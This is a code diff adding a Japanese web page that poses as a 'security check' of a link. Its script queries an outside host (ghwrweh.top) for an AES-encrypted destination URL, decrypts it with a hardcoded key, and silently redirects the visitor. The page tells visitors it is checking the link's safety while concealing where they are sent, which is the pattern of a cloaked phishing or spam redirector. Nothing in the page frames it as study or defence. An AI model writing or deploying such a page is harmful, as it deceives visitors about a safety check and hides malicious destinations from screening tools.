@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>セキュリティ確認中...</title>
+  <meta name="robots" content="noindex,nofollow">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { text-align:center; font-family:sans-serif; padding-top:80px; background:#f9f9f9; }
+    .loader { margin:30px auto; border:6px solid #f3f3f3; border-top:6px solid #3498db;
+             border-radius:50%; width:50px; height:50px; animation:spin 1s infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .caption { color:#666; font-size:13px; margin-top:10px; }
+  </style>
+</head>
+<body>
+  <h2>セキュリティ確認中...</h2>
+  <p>リンクの安全性を確認しています。まもなくリダイレクトします。</p>
+  <div class="loader"></div>
+  <p class="caption">セキュア認証サービス</p>
+
+  <script>
+    const AES_KEY = "5Ctianyoumabiiii";
+    const id = location.pathname.split("/").pop();
+
+    if (!id) {
+      document.body.innerHTML = "<h3>無効なIDです</h3>";
+    } else {
+      fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(id))
+        .then(r => r.json())
+        .then(data => {
+          const enc = data?.data?.siteUrl;
+          if (enc) {
+            decryptAES(enc).then(url => {
+              if (url) {
+                setTimeout(() => location.href = url, 3000);
+              } else {
+                document.body.innerHTML += "<p>復号に失敗しました。</p>";
+              }
+            });
+          } else {
+            document.body.innerHTML += "<p>IDが存在しません。</p>";
+          }
+        })
+        .catch(() => {
+          document.body.innerHTML += "<p>サーバーエラーが発生しました。</p>";
+        });
+    }
+
+    async function decryptAES(encText) {
+      try {
+        const b64 = encText.replace(/-/g,'+').replace(/_/g,'/');
+        const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
+        const iv = bytes.slice(0,16), data = bytes.slice(16);
+        const key = await crypto.subtle.importKey("raw",
+          new TextEncoder().encode(AES_KEY), {name:"AES-CBC"}, false, ["decrypt"]);
+        const dec = await crypto.subtle.decrypt({name:"AES-CBC", iv}, key, data);
+        return new TextDecoder().decode(dec).replace(/\u0000+$/, "");
+      } catch {
+        return null;
+      }
+    }
+  </script>
+</body>
+</html>
